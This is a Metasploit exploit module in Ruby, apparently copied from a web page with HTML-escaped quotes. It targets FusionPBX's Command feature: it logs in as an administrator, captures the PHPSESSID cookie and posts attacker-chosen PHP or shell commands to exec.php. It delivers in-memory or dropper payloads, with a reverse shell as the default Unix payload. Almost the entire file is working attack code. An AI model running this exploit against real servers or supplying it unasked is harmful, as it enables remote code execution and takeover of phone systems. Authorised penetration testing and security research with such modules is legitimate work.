# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;FusionPBX Command exec.php Command Execution&#039;,
      &#039;Description&#039;     => %q{
        This module uses administrative functionality available in FusionPBX
        to gain a shell.

        The Command section of the application permits users with `exec_view`
        permissions, or superadmin permissions, to execute arbitrary system
        commands, or arbitrary PHP code, as the web server user.

        This module has been tested successfully on FusionPBX version
        4.4.1 on Ubuntu 19.04 (x64).
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          => [&#039;bcoles&#039;],
      &#039;References&#039;      =>
        [
          [&#039;URL&#039;, &#039;https://docs.fusionpbx.com/en/latest/advanced/command.html&#039;]
        ],
      &#039;Platform&#039;        => %w[php linux unix],
      &#039;Arch&#039;            => [ARCH_PHP, ARCH_CMD, ARCH_X86, ARCH_X64],
      &#039;Targets&#039;         =>
        [
          [&#039;Automatic (PHP In-Memory)&#039;,
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Type&#039;           => :php_memory
          ],
          [&#039;Automatic (Unix In-Memory)&#039;,
            &#039;Platform&#039;       => &#039;unix&#039;,
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse&#039;},
            &#039;Type&#039;           => :unix_memory
          ],
          [&#039;Automatic (Linux Dropper)&#039;,
            &#039;Platform&#039;       => &#039;linux&#039;,
            &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
            &#039;Type&#039;           => :linux_dropper
          ]
        ],
      &#039;Privileged&#039;      => false,
      &#039;DefaultOptions&#039;  => { &#039;SSL&#039; => true, &#039;RPORT&#039; => 443 },
      &#039;DisclosureDate&#039;  => &#039;2019-11-02&#039;,
      &#039;DefaultTarget&#039;   => 0))
    register_options [
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to FusionPBX&#039;, &#039;/&#039;]),
      OptString.new(&#039;USERNAME&#039;, [true, &#039;The username for FusionPBX&#039;, &#039;admin&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password for FusionPBX&#039;])
    ]
  end

  def login(user, pass)
    vprint_status "Authenticating as user &#039;#{user}&#039;"

    vars_post = {
      username: user,
      password: pass,
      path: &#039;&#039;
    }

    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;core/user_settings/user_dashboard.php&#039;),
      &#039;vars_post&#039; => vars_post
    })

    unless res
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end

    if res.code == 302 && res.headers[&#039;location&#039;].include?(&#039;login.php&#039;)
      fail_with Failure::NoAccess, "Login failed for user &#039;#{user}&#039;"
    end

    unless res.code == 200
      fail_with Failure::UnexpectedReply, "Unexpected HTTP response status code #{res.code}"
    end

    cookie = res.get_cookies.to_s.scan(/PHPSESSID=(.+?);/).flatten.first

    unless cookie
      fail_with Failure::UnexpectedReply, &#039;Failed to retrieve PHPSESSID cookie&#039;
    end

    print_good "Authenticated as user &#039;#{user}&#039;"

    cookie
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path)
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    if res.body.include?(&#039;FusionPBX&#039;)
      return CheckCode::Detected
    end

    CheckCode::Safe
  end

  def execute_command(cmd, opts = {})
    vars_post = {
      handler: &#039;php&#039;,
      table_name: &#039;&#039;,
      sql_type: &#039;&#039;,
      id: &#039;&#039;,
      cmd: cmd
    }

    case opts[:handler]
    when &#039;php&#039;
      vars_post[:handler] = &#039;php&#039;
    when &#039;shell&#039;
      vars_post[:handler] = &#039;shell&#039;
    when &#039;switch&#039;
      vars_post[:handler] = &#039;switch&#039;
      vars_post[:cmd] = "bg_system #{cmd}"
    else
      vars_post[:handler] = &#039;shell&#039;
    end

    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;app/exec/exec.php&#039;),
      &#039;cookie&#039;    => "PHPSESSID=#{@cookie}",
      &#039;vars_post&#039; => vars_post
    }, 5)

    unless res
      return if session_created?
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end

    unless res.code == 200
      fail_with Failure::UnexpectedReply, "Unexpected HTTP response status code #{res.code}"
    end

    if res.body.include? &#039;access denied&#039;
      fail_with Failure::NoAccess, "User #{datastore[&#039;USERNAME&#039;]} does not have permission to execute #{vars_post[:handler]} #{vars_post[:handler].eql?(&#039;php&#039;) ? &#039;code&#039; : &#039;commands&#039;}"
    end

    res
  end

  def exploit
    unless check == CheckCode::Detected
      fail_with Failure::NotVulnerable, "#{peer} - Target is not vulnerable"
    end

    @cookie = login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])

    print_status "Sending payload (#{payload.encoded.length} bytes) ..."

    case target[&#039;Type&#039;]
    when :php_memory
      execute_command(payload.encoded, handler: &#039;php&#039;)
    when :unix_memory
      execute_command(payload.encoded, handler: &#039;shell&#039;)
    when :linux_dropper
      execute_cmdstager(:linemax => 1_500, handler: &#039;shell&#039;)
    end
  end
end

